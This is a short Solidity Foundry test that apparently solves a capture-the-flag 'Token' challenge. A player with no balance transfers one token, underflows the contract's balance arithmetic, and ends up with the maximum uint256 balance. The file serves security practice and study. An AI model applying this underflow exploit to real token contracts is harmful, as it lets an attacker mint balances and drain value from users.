// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address _owner) external view returns (uint256 balance);
}

contract TokenTest is Test {
    IToken public target;
    address player = vm.addr(1);

    function setUp() public {
        address deployment = deployCode(
            "5-Token.sol:Token",
            abi.encodePacked(uint256(20))
        );
        target = IToken(deployment);

        vm.label(address(target), "Challenge");
        vm.label(address(player), "Player");
    }

    function testToken() public {
        vm.startPrank(address(player));

        target.transfer(address(0), 1);

        assertTrue(target.balanceOf(player) == type(uint256).max);
    }
}
